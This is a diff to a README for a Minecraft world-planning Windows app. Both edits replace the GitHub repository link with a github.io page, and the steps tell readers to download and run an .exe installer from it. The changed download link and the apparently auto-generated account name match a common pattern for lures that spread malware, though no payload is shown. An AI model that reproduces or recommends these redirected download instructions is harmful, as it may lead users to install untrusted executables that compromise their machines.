@@ -1,6 +1,6 @@
 # 🗺️ minecraft-server-roadmap-v1 - Plan your Minecraft world progression easily
 
-[![Download Minecraft Server Roadmap](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Intermolecular-gymkhana175/minecraft-server-roadmap-v1)
+[![Download Minecraft Server Roadmap](https://img.shields.io/badge/Download-Release-blue)](https://intermolecular-gymkhana175.github.io)
 
 ## 📖 About this application
 
@@ -21,7 +21,7 @@ To run this application on your Windows computer, you need the following items:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official repository page at [https://github.com/Intermolecular-gymkhana175/minecraft-server-roadmap-v1](https://github.com/Intermolecular-gymkhana175/minecraft-server-roadmap-v1).
+1.  Visit the official repository page at [https://intermolecular-gymkhana175.github.io](https://intermolecular-gymkhana175.github.io).
 2.  Locate the release section on the right side of the screen.
 3.  Choose the latest version of the installer file, which ends in .exe.
 4.  Save the file to your computer.
